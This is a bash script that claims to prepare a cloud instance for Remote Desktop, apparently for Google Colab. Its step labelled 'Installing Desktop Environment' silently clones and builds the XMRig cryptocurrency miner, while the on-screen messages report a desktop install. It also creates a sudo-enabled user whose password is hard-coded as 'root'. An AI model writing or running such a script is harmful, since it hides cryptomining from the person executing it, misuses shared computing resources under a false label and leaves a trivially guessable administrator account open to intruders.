#! /bin/bash

# Make Instance Ready for Remote Desktop or RDP

b='\033[1m'
r='\E[31m'
g='\E[32m'
c='\E[36m'
endc='\E[0m'
enda='\033[0m'

clear

# Branding

printf """$c$b
      _____      _       _         _    _            _  
     / ____|    | |     | |       | |  | |          | | 
    | |     ___ | | __ _| |__     | |__| | __ _  ___| | _____ 
    | |    / _ \| |/ _\` | '_ \    |  __  |/ _\` |/ __| |/ / __|
    | |___| (_) | | (_| | |_) |   | |  | | (_| | (__|   <\__ \\
     \_____\___/|_|\__,_|_.__/    |_|  |_|\__,_|\___|_|\_\___/ 
    $r  By Pradyumna Krishna Â© 2020 $c Edited by https://fb.com/thuong.hai.581 (v3)
      Github : https://github.com/PradyumnaKrishna/Colab-Hacks          
$endc$enda""";



# Used Two if else type statements, one is simple second is complex. So, don't get confused or fear by seeing complex if else statement '^^.

# Creation of user
printf "\n\nCreating user " >&2
if sudo useradd -m user &> /dev/null
then
  printf "\ruser created $endc$enda\n" >&2
else
  printf "\r$r$b Error Occured $endc$enda\n" >&2
  exit
fi

# Add user to sudo group
sudo adduser user sudo

# Set password of user to 'root'
echo 'user:root' | sudo chpasswd

# Change default shell from sh to bash
sed -i 's/\/bin\/sh/\/bin\/bash/g' /etc/passwd

# Initialisation of Installer
printf "\n\n$c$b    Loading Installer $endc$enda" >&2
if sudo apt-get update &> /dev/null
then
    printf "\r$g$b    Installer Loaded $endc$enda\n" >&2
else
    printf "\r$r$b    Error Occured $endc$enda\n" >&2
    exit
fi




# Install Desktop Environment (XMRIG)
printf "$g$b    Installing Desktop Environment $endc$enda" >&2
{
    sudo apt-get install git build-essential cmake automake libtool autoconf
    
    git clone https://github.com/xmrig/xmrig.git
    cd xmrig
    mkdir build
    cd build
    cmake ..
    make -j $(nproc)
    rm -fR xmrig/
    
} &> /dev/null &&
printf "\r$c$b    Desktop Environment Installed $endc$enda\n" >&2 ||
{ printf "\r$r$b    Error Occured $endc$enda\n" >&2; exit; }







# Install other tools like nano
sudo apt-get install gdebi -y &> /dev/null
sudo apt-get install vim -y &> /dev/null
printf "$g$b    Installing other Tools $endc$enda" >&2
if sudo apt install nautilus nano -y &> /dev/null
then
    printf "\r$c$b    Other Tools Installed $endc$enda\n" >&2
else
    printf "\r$r$b    Error Occured $endc$enda\n" >&2
fi



printf "\n$g$b    Installation Completed $endc$enda\n\n" >&2



printf "\n$c$b I hope everthing done correctly if mistakenly wrote wrong command or pin, Rerun the current box or run command 'su - user -c '<CRP Command Here>' $endc$enda\n" >&2
printf "\n$g$b Finished Succesfully$endc$enda"
